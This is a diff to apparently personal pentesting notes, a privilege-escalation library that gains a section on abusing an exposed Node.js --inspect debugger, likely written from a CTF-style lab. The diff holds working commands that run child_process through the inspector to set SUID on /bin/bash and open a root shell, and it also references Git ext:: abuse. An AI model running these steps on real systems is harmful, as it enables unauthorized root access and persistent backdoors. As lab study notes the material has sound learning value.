@@ -15,6 +15,7 @@ This is a PrivEsc common library, that gathers all generic techniques (and not s
     - [[Privilege Escalation - Common Library#Sudo pager escape|Sudo pager escape]]
     - [[Privilege Escalation - Common Library#PATH hijack (SUID binary)|PATH hijack (SUID binary)]]
     - [[Privilege Escalation - Common Library#Git ext:: abuse|Git ext:: abuse]]
+    - [[Privilege Escalation - Common Library#Node.js --inspect debugger abuse|Node.js --inspect debugger abuse]]
 
 ---
 
@@ -48,11 +49,11 @@ Finds regular files writable by the current user, excluding `/proc` and `/sys` (
 
 ### What is (in) the system? Who else is in the system?
 
-|Command|Description|
-|---|---|
-|`uname -a`|Prints system information: kernel version, architecture (x86/x64/ARM)|
-|`cat /etc/os-release`|Distribution name and version (Ubuntu, Debian, etc.)|
-|`ls -la /home/`|Lists all folders (and thus users) in /home. `-l` = long listing (perms etc), `-a` = all|
+| Command               | Description                                                                              |
+| --------------------- | ---------------------------------------------------------------------------------------- |
+| `uname -a`            | Prints system information: kernel version, architecture (x86/x64/ARM)                    |
+| `cat /etc/os-release` | Distribution name and version (Ubuntu, Debian, etc.)                                     |
+| `ls -la /home/`       | Lists all folders (and thus users) in /home. `-l` = long listing (perms etc), `-a` = all |
 
 **Users with a shell:**
 
@@ -431,3 +432,48 @@ whoami  # root
 - `clone_prod_change.py` used GitPython with `protocol.ext.allow=always`
 - Passed `ext::sh -c /tmp/pwn.sh` as the URL
 - Script chmodded `/bin/bash` as root
+
+---
+
+### Node.js --inspect debugger abuse
+
+> A Node process started with `--inspect[=host:port]` (default `9229`) exposes the V8 Inspector. Anyone reaching that port can run arbitrary JS **as the process owner**. Root-owned process = instant root.
+
+**Conditions needed:**
+
+- A Node process running with `--inspect` (spot the flag in `ps`)
+- Reach to the inspector port (usually `127.0.0.1` — fine once you have a foothold)
+- Process runs as a higher-priv user (root = jackpot)
+
+**Detect:**
+
+```bash
+ps aux | grep -- '--inspect'   # the -- stops grep eating --inspect as a flag; note the port AND owner
+```
+
+**Exploit (easy way, Node's built-in client):**
+
+```bash
+curl http://127.0.0.1:9229/json     # confirms debugger, returns webSocketDebuggerUrl
+node inspect 127.0.0.1:9229         # auto-attaches → debug> prompt
+```
+
+At the `debug>` prompt (gotchas: no plain `require`, use `process.mainModule.require`; quit with `.exit` not `exit`):
+
+```javascript
+exec("process.mainModule.require('child_process').execSync('id').toString()")            // confirm uid=0
+exec("process.mainModule.require('child_process').execSync('chmod +s /bin/bash').toString()")
+```
+
+Then `.exit` and cash in:
+
+```bash
+/bin/bash -p   # → root (SUID-on-bash persistence)
+```
+
+**Why it works:** `--inspect` is a dev debugging feature that grants full JS eval inside the process; localhost binding is no protection once you're on the host (same lesson as "internal only" services on [[Helix]]). JS runs with the process's privileges.
+
+**Real example ([[Reactor]]):**
+
+- root `uptime-monitor` worker running with `--inspect=127.0.0.1:9229`; `worker.js` was `root:root 644` (not writable, so editing the scheduled script was a dead end — the flag was the door)
+- `node inspect` → `child_process` via `process.mainModule.require` → `chmod +s /bin/bash` → `/bin/bash -p` → root
